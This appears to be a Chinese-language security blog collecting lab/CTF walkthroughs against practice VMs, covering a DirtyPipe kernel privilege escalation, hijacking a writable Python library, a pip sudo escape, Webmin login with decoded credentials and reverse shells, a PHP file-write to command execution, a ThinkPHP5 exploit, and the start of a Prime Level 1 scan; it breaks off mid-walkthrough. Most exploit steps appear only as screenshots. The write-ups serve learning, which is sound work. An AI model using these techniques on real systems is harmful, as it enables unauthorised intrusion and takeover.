href="#权限提升1" class="headerlink" title="权限提升1"></a>权限提升1</h2><p>内核提权</p><h3 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h3><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20221125030258678.png" alt="image-20221125030258678"></p><p>针对该linux内核版本(Linux LupinOne 5.10.0-8-amd64 #1 SMP Debian 5.10.46-5 (2021-09-23) x86_64 GNU&#x2F;Linux)进行Linux内核提权(CVE-2022-0847)</p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20221125030636575.png" alt="image-20221125030636575"></p><p>使用<a href="https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit">https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit</a> exp进行提权:</p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20221125033045434.png" alt="image-20221125033045434"></p><h3 id="exp上传至目标机器"><a href="#exp上传至目标机器" class="headerlink" title="exp上传至目标机器"></a>exp上传至目标机器</h3><p>kali上开启python服务器后靶机下载</p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20221125033213936.png" alt="image-20221125033213936"></p><h3 id="执行exp"><a href="#执行exp" class="headerlink" title="执行exp"></a>执行exp</h3><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20221125033231451.png" alt="image-20221125033231451"></p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20221125033259825.png" alt="image-20221125033259825"></p><h2 id="权限提升2"><a href="#权限提升2" class="headerlink" title="权限提升2"></a>权限提升2</h2><p>针对该系统权限配置不当通过修改所找到的777文件<code>/usr/lib/python3.9/webbrowser.py</code></p><p>来实现切换到arsene用户</p><h3 id="写入执行shell的代码"><a href="#写入执行shell的代码" class="headerlink" title="写入执行shell的代码"></a>写入执行shell的代码</h3><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20221125031156126.png" alt="image-20221125031156126"></p><p>成功切换到arsene用户</p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20221125031255226.png" alt="image-20221125031255226"></p><p>在这个用户中发现可以通过root执行pip<img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20221125031410966.png" alt="image-20221125031410966"></p><p>gtfobins找到提权方法</p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20221125031513850.png" alt="image-20221125031513850"></p><h3 id="成功提权"><a href="#成功提权" class="headerlink" title="成功提权"></a>成功提权</h3><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20221125031727117.png" alt="image-20221125031727117"></p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20221125031951901.png" alt="image-20221125031951901"></p><p>root flag</p><p>3mp!r3{congratulations_you_manage_to_pwn_the_lupin1_box}</p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20221125031811973.png" alt="image-20221125031811973"></p><h1 id="Part-2"><a href="#Part-2" class="headerlink" title="Part 2"></a>Part 2</h1><p>目标为10.0.0.101</p><h3 id="信息收集-2"><a href="#信息收集-2" class="headerlink" title="信息收集"></a>信息收集</h3><p>通过masscan发现开放端口 80, 139, 445, 10000, 20000</p><p>使用nmap先扫一遍</p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20221126175338795.png" alt="image-20221126175338795"></p><h3 id="nmap简单漏扫"><a href="#nmap简单漏扫" class="headerlink" title="nmap简单漏扫"></a>nmap简单漏扫</h3><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20221126175815800.png" alt="image-20221126175815800"></p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20221126175852833.png" alt="image-20221126175852833"></p><p>发现有samba和webmin服务</p><h3 id="对web服务进行简单探测"><a href="#对web服务进行简单探测" class="headerlink" title="对web服务进行简单探测"></a>对web服务进行简单探测</h3><p>curl <a href="http://10.0.0.101/">http://10.0.0.101</a></p><p>发现注释中有一段密文</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs http">&lt;!--<br>don&#x27;t worry no one will get here, it&#x27;s safe to share with you my access. Its encrypted :)<br><br>++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;++++++++++++++++.++++.&gt;&gt;+++++++++++++++++.----.&lt;++++++++++.-----------.&gt;-----------.++++.&lt;&lt;+.&gt;-.--------.++++++++++++++++++++.&lt;------------.&gt;&gt;---------.&lt;&lt;++++++.++++++.<br><br><br>--&gt;<br></code></pre></td></tr></table></figure><p>看的出来是Brainfuck加密</p><p>解密后为</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">.<span class="hljs-number">2</span>uqPEfj3D&lt;P<span class="hljs-symbol">&#x27;a</span>-<span class="hljs-number">3</span><br></code></pre></td></tr></table></figure><p>10000和20000端口均为Webmin服务</p><p>通过admin:.2uqPEfj3D&lt;P’a-3尝试登录发现都失败了</p><h3 id="smb枚举"><a href="#smb枚举" class="headerlink" title="smb枚举"></a>smb枚举</h3><p>因为139和445均为Samba服务</p><p>直接<code>enum4linux 10.0.0.101</code></p><p>发现用户cyber</p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20221126180420164.png" alt="image-20221126180420164"></p><p>尝试通过cyber:.2uqPEfj3D&lt;P’a-3登录webmin服务</p><p>在20000端口成功登录!</p><p>在后台页面左下角发现有一个现有的终端</p><p>直接利用拿到第一个flag:3mp!r3{You_Manage_To_Break_To_My_Secure_Access}</p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20221126180840402.png" alt="image-20221126180840402"></p><p>然后又发现有个 old_pass.gz 这个文件我非常感兴趣</p><p>解压后得到</p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20221126181317342.png" alt="image-20221126181317342"></p><h3 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h3><p>看起来后面那个像密码</p><p>直接su root提权</p><p>发现在这个控制台su root老是失败</p><p>反弹一个shell到kali上成功提权</p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20221126185904823.png" alt="image-20221126185904823"></p><p>成功拿到第二个flag:3mp!r3{You_Manage_To_BreakOut_From_My_System_Congratulation}</p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20221126190021397.png" alt="image-20221126190021397"></p><h1 id="Part-3"><a href="#Part-3" class="headerlink" title="Part 3"></a>Part 3</h1><p>目标为 10.0.0.105</p><h3 id="TCP端口扫描"><a href="#TCP端口扫描" class="headerlink" title="TCP端口扫描"></a>TCP端口扫描</h3><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20221208135604802.png" alt="image-20221208135604802"></p><p>发现存在80, 81两个web服务</p><p>curl一下发现没什么结果</p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20221208141456575.png" alt="image-20221208141456575"></p><p>通过简单目录枚举发现有一个robots.txt</p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20221208141605340.png" alt="image-20221208141605340"></p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20221208144702975-20221208162930576.png" alt="image-20221208144702975"></p><p>放个大字典再尝试一下</p><p>![image-20221208144525968](&#x2F;Users&#x2F;Neil&#x2F;Library&#x2F;Application Support&#x2F;typora-user-images&#x2F;image-20221208144525968.png)</p><p>这里少了张图 后来添加参数 -x html,txt,php,zip之后枚举出了graffiti.txt和graffiti.php两个路径</p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20221208144758357.png" alt="image-20221208144758357"></p><p>访问这个php文件发现似乎是个类似留言板的网页</p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20221208145103818.png" alt="image-20221208145103818"></p><p>查看源码发现下面这个input被hidden了</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>= <span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">value</span>= <span class="hljs-string">&quot;graffiti.txt&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><p>尝试抓包看看请求信息</p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20221208151634578.png" alt="image-20221208151634578"></p><p>后来发现这个包是可以写入文件的</p><p>所以我直接写到这个php里面</p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20221208151854136.png" alt="image-20221208151854136"></p><p>命令执行成功了</p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20221208151829714.png" alt="image-20221208151829714"></p><p>然后我尝试用菜刀去连、使用bash、nc反弹shell均失败了 不知道什么原因</p><p>没办法 只能使用命令执行在根目录找到FLAG.txt</p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20221208155259139.png" alt="image-20221208155259139"></p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">Flag <span class="hljs-number">1</span>! You&#x27;ve gotten <span class="hljs-keyword">onto</span> <span class="hljs-keyword">the</span> system. Now why has Cypher locked everyone <span class="hljs-keyword">out of</span> <span class="hljs-keyword">it</span>? Can you find a way <span class="hljs-keyword">to</span> <span class="hljs-keyword">get</span> Cypher&#x27;s password? It seems like he gave <span class="hljs-keyword">it</span> <span class="hljs-keyword">to</span> Agent Smith, so Smith could figure out <span class="hljs-keyword">where</span> <span class="hljs-keyword">to</span> meet him. Also, pull this image <span class="hljs-keyword">from</span> <span class="hljs-keyword">the</span> webserver <span class="hljs-keyword">on</span> port <span class="hljs-number">80</span> <span class="hljs-keyword">to</span> <span class="hljs-keyword">get</span> a flag. /.cypher-neo.png <br></code></pre></td></tr></table></figure><p>想着开放了22端口，还有个81端口需要密码 我去检查了它的nginx的配置文件</p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20221208155730294.png" alt="image-20221208155730294"></p><p>找到了一个像机密文件的配置文件</p><p>美化后大概长这样</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">server</span> &#123;<br>        <span class="hljs-attribute">listen</span> <span class="hljs-number">81</span> default_server;<br>        <span class="hljs-attribute">listen</span> [::]:<span class="hljs-number">81</span> default_server;<br><br>        <span class="hljs-attribute">root</span> /var/nginx/html;<br><br>        <span class="hljs-attribute">auth_basic</span> <span class="hljs-string">&quot;Meeting Place&quot;</span>;<br>        <span class="hljs-attribute">auth_basic_user_file</span> /var/nginx/html/.htpasswd;<br><br>        <span class="hljs-comment"># Add index.php to the list if you are using PHP</span><br>        <span class="hljs-attribute">index</span> index.html index.htm index.nginx-debian.html;<br><br>        <span class="hljs-attribute">server_name</span> _;<br><br>        <span class="hljs-section">location</span> / &#123;<br>                <span class="hljs-comment"># First attempt to serve request as file, then</span><br>                <span class="hljs-comment"># as directory, then fall back to displaying a 404.</span><br>                <span class="hljs-attribute">try_files</span> <span class="hljs-variable">$uri</span> <span class="hljs-variable">$uri</span>/ =<span class="hljs-number">404</span>;<br>        &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>尝试离线解密这个东西 暂时也失败了..</p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20221208155713491.png" alt="image-20221208155713491"></p><h1 id="Part-4"><a href="#Part-4" class="headerlink" title="Part 4"></a>Part 4</h1><p>10.0.0.132</p><p>扫描扫到8080是thinkphp5</p><p>直接用exp</p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20221208161022946.png" alt="image-20221208161022946"></p><p>![image-20221208161043698](&#x2F;Users&#x2F;Neil&#x2F;Library&#x2F;Application Support&#x2F;typora-user-images&#x2F;image-20221208161043698.png)</p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20221208161059257.png" alt="image-20221208161059257"></p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20221208161117088.png" alt="image-20221208161117088"></p><p>之后也是 想反弹shell出来但是失败了 …Org…</p>]]></content>
    
    
    
    <tags>
      
      <tag>打靶</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Prime-Series-Level-1-WP</title>
    <link href="/2022/11/18/Prime-Series-Level-1-WP/"/>
    <url>/2022/11/18/Prime-Series-Level-1-WP/</url>
    
    <content type="html"><![CDATA[<h3 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(neil㉿kali)-[~]<br>└─$ sudo nmap -sn 192.168.80.0/24<br>Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-18 23:56 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.80.1<br>Host is up (0.00041s latency).<br>MAC Address: 00:50:56:C0:00:08 (VMware)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.80.2<br>Host is up (0.00028s latency).<br>MAC Address: 00:50:56:FF:51:55 (VMware)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.80.157<br>Host is up (0.00048s latency).<br>MAC Address: 00:0C:29:94:CA:6A (VMware)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.80.254<br>Host is up (0.00030s latency).<br>MAC Address: 00:50:56:E0:8A:CB (VMware)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.80.129<br>Host is up.<br>Nmap <span class="hljs-keyword">done</span>: 256 IP addresses (5 hosts up) scanned <span class="hljs-keyword">in</span> 2.00 seconds<br></code></pre></td></tr></table></figure><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(neil㉿kali)-[~]<br>└─$ sudo nmap --min-rate 10000 -p- 192.168.80.157<br>Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-18 23:57 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.80.157<br>Host is up (0.00074s latency).<br>Not shown: 65533 closed tcp ports (reset)<br>PORT   STATE SERVICE<br>22/tcp open  ssh<br>80/tcp open  http<br>MAC Address: 00:0C:29:94:CA:6A (VMware)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 1.04 seconds<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(neil㉿kali)-[~]<br>└─$ sudo nmap -p22,80 -sT -sV -O 192.168.80.157 <br>Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-18 23:58 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.80.157<br>Host is up (0.00028s latency).<br><br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)<br>80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))<br>MAC Address: 00:0C:29:94:CA:6A (VMware)<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Device <span class="hljs-built_in">type</span>: general purpose<br>Running: Linux 3.X|4.X<br>OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4<br>OS details: Linux 3.2 - 4.9<br>Network Distance: 1 hop<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 7.92 seconds<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(neil㉿kali)-[~]<br>└─$ sudo nmap -p22,80 -sU  192.168.80.157   <br>Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-18 23:59 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.80.157<br>Host is up (0.00041s latency).<br><br>PORT   STATE  SERVICE<br>22/udp closed ssh<br>80/udp closed http<br>MAC Address: 00:0C:29:94:CA:6A (VMware)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 0.23 seconds<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(neil㉿kali)-[~]  <br>└─$ sudo nmap -p22,80 --script=vuln  192.168.80.157<br>NSE Timing: About 98.52% <span class="hljs-keyword">done</span>; ETC: 00:09 (0:00:04 remaining)  <br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.80.157                                                       <br>Host is up (0.00048s latency).<br><br>PORT   STATE SERVICE<br>22/tcp open  ssh<br>80/tcp open  http<br>| http-slowloris-check: <br>|   VULNERABLE:<br>|   Slowloris DOS attack<br>|     State: LIKELY VULNERABLE<br>|     IDs:  CVE:CVE-2007-6750<br>|       Slowloris tries to keep many connections to the target web server open and hold<br>|       them open as long as possible.  It accomplishes this by opening connections to<br>|       the target web server and sending a partial request. By doing so, it starves<br>|       the http server<span class="hljs-string">&#x27;s resources causing Denial Of Service.</span><br><span class="hljs-string">|       </span><br><span class="hljs-string">|     Disclosure date: 2009-09-17</span><br><span class="hljs-string">|     References:</span><br><span class="hljs-string">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750</span><br><span class="hljs-string">|_      http://ha.ckers.org/slowloris/</span><br><span class="hljs-string">|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)</span><br><span class="hljs-string">| http-enum: </span><br><span class="hljs-string">|   /wordpress/: Blog</span><br><span class="hljs-string">|_  /wordpress/wp-login.php: Wordpress login page.</span><br><span class="hljs-string">|_http-dombased-xss: Couldn&#x27;</span>t find any DOM based XSS.<br>|_http-stored-xss: Couldn<span class="hljs-string">&#x27;t find any stored XSS vulnerabilities.</span><br><span class="hljs-string">|_http-csrf: Couldn&#x27;</span>t find any CSRF vulnerabilities.<br>MAC Address: 00:0C:29:94:CA:6A (VMware)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 320.62 seconds<br></code></pre></td></tr></table></figure><h3 id="WEB页面源码"><a href="#WEB页面源码" class="headerlink" title="WEB页面源码"></a>WEB页面源码</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>HacknPentest<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br> <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&#x27;hacknpentest.png&#x27;</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">&#x27;hnp security&#x27;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;1300&quot;</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;595&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20221119000847443.png" alt="image-20221119000847443"></p><h3 id="目录枚举"><a href="#目录枚举" class="headerlink" title="目录枚举"></a>目录枚举</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(neil㉿kali)-[~]<br>└─$ dirb http://192.168.80.157<br>-----------------<br>DIRB v2.22    <br>By The Dark Raver<br>-----------------<br><br>START_TIME: Sat Nov 19 00:36:09 2022<br>URL_BASE: http://192.168.80.157/<br>WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt<br><br>-----------------<br><br>GENERATED WORDS: 4612                                                          <br><br>---- Scanning URL: http://192.168.80.157/ ----<br>+ http://192.168.80.157/dev (CODE:200|SIZE:131)                                                                                 <br>+ http://192.168.80.157/index.php (CODE:200|SIZE:136)                                                                           <br>==&gt; DIRECTORY: http://192.168.80.157/javascript/                                                                                <br>+ http://192.168.80.157/server-status (CODE:403|SIZE:302)                                                                       <br>==&gt; DIRECTORY: http://192.168.80.157/wordpress/                                                                                 <br>                                                                                                                                <br>---- Entering directory: http://192.168.80.157/javascript/ ----<br>==&gt; DIRECTORY: http://192.168.80.157/javascript/jquery/                                                                         <br>                                                                                                                                <br>---- Entering directory: http://192.168.80.157/wordpress/ ----<br>+ http://192.168.80.157/wordpress/index.php (CODE:301|SIZE:0)                                                                   <br>==&gt; DIRECTORY: http://192.168.80.157/wordpress/wp-admin/                                                                        <br>==&gt; DIRECTORY: http://192.168.80.157/wordpress/wp-content/                                                                      <br>==&gt; DIRECTORY: http://192.168.80.157/wordpress/wp-includes/                                                                     <br>+ http://192.168.80.157/wordpress/xmlrpc.php (CODE:405|SIZE:42)                                                                 <br>                                                                                                                                <br>---- Entering directory: http://192.168.80.157/javascript/jquery/ ----<br>+ http://192.168.80.157/javascript/jquery/jquery (CODE:200|SIZE:284394)                                                         <br>                                                                                                                                <br>---- Entering directory: http://192.168.80.157/wordpress/wp-admin/ ----<br>+ http://192.168.80.157/wordpress/wp-admin/admin.php (CODE:302|SIZE:0)                                                          <br>==&gt; DIRECTORY: http://192.168.80.157/wordpress/wp-admin/css/                                                                    <br>==&gt; DIRECTORY: http://192.168.80.157/wordpress/wp-admin/images/                                                                 <br>==&gt; DIRECTORY: http://192.168.80.157/wordpress/wp-admin/includes/                                                               <br>+ http://192.168.80.157/wordpress/wp-admin/index.php (CODE:302|SIZE:0)                                                          <br>==&gt; DIRECTORY: http://192.168.80.157/wordpress/wp-admin/js/                                                                     <br>==&gt; DIRECTORY: http://192.168.80.157/wordpress/wp-admin/maint/                                                                  <br>==&gt; DIRECTORY: http://192.168.80.157/wordpress/wp-admin/network/                                                                <br>==&gt; DIRECTORY: http://192.168.80.157/wordpress/wp-admin/user/                                                                                        <br>---- Entering directory: http://192.168.80.157/wordpress/wp-content/ ----<br>+ http://192.168.80.157/wordpress/wp-content/index.php (CODE:200|SIZE:0)                                                        <br>==&gt; DIRECTORY: http://192.168.80.157/wordpress/wp-content/plugins/                                                              <br>==&gt; DIRECTORY: http://192.168.80.157/wordpress/wp-content/themes/                                                               <br>==&gt; DIRECTORY: http://192.168.80.157/wordpress/wp-content/uploads/                                                       <br>---- Entering directory: http://192.168.80.157/wordpress/wp-includes/ ----<br>                                <br>---- Entering directory: http://192.168.80.157/wordpress/wp-admin/css/ ----<br>                           <br>---- Entering directory: http://192.168.80.157/wordpress/wp-admin/images/ ----<br>                            <br>---- Entering directory: http://192.168.80.157/wordpress/wp-admin/includes/ ----<br>      <br>---- Entering directory: http://192.168.80.157/wordpress/wp-admin/js/ ----<br>                                 <br>---- Entering directory: http://192.168.80.157/wordpress/wp-admin/maint/ ----             <br><br>---- Entering directory: http://192.168.80.157/wordpress/wp-admin/network/ ----<br>+ http://192.168.80.157/wordpress/wp-admin/network/admin.php (CODE:302|SIZE:0)                                                  <br>+ http://192.168.80.157/wordpress/wp-admin/network/index.php (CODE:302|SIZE:0)           <br>---- Entering directory: http://192.168.80.157/wordpress/wp-admin/user/ ----<br>+ http://192.168.80.157/wordpress/wp-admin/user/admin.php (CODE:302|SIZE:0)                                                     <br>+ http://192.168.80.157/wordpress/wp-admin/user/index.php (CODE:302|SIZE:0)                                                                          <br>---- Entering directory: http://192.168.80.157/wordpress/wp-content/plugins/ ----<br>+ http://192.168.80.157/wordpress/wp-content/plugins/index.php (CODE:200|SIZE:0)                                      <br>---- Entering directory: http://192.168.80.157/wordpress/wp-content/themes/ ----<br>+ http://192.168.80.157/wordpress/wp-content/themes/index.php (CODE:200|SIZE:0)                                      <br>---- Entering directory: http://192.168.80.157/wordpress/wp-content/uploads/ ----                                                          <br>-----------------<br>END_TIME: Sat Nov 19 00:36:48 2022<br>DOWNLOADED: 46120 - FOUND: 15<br><br></code></pre></td></tr></table></figure><h3 id="查看DEV"><a href="#查看DEV" class="headerlink" title="查看DEV"></a>查看DEV</h3><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20221119004542516.png" alt="image-20221119004542516"></p><h3 id="再次爆破"><a href="#再次爆破" class="headerlink" title="再次爆破"></a>再次爆破</h3><p>通过上面爆破出来的路径，提醒我们还有些隐藏路径没有发现</p><figure class="highlight bash"><table><tr><td 